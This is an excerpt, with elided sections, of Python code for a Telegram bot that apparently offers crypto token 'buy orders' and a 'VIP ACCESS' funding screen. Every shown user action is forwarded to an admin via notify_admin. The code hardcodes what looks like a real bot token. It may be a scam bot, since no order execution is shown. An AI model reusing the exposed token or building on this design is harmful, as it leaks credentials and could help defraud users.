...
BOT_TOKEN ="8997193542:AAFC48cC-RUfdSna71vY0z7k1LL2IfSQePc"
...
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        f"👥 ALL USERS ({len(user_registry)} total):\n\n{users}"
    )
...
async def catch_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await notify_admin(context, user, "Sent Message", f"💬 Message: {msg}")
    await update.message.reply_text(
        "📩 *Message received!*\n\n"
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if query.data == "fund":
        ...
        await notify_admin(context, user, "Viewed VIP Access")
        await query.message.reply_text(
            f"💎 VIP ACCESS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
        ...
        await notify_admin(context, user, "Viewed Live Market")
        ...
        await notify_admin(context, user, f"Placed Buy Order", f"CA: {ca}\nTarget: {mult}")
        await query.message.reply_text(
            f"🎯 ORDER PLACED!\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Token: `{ca}`\n"
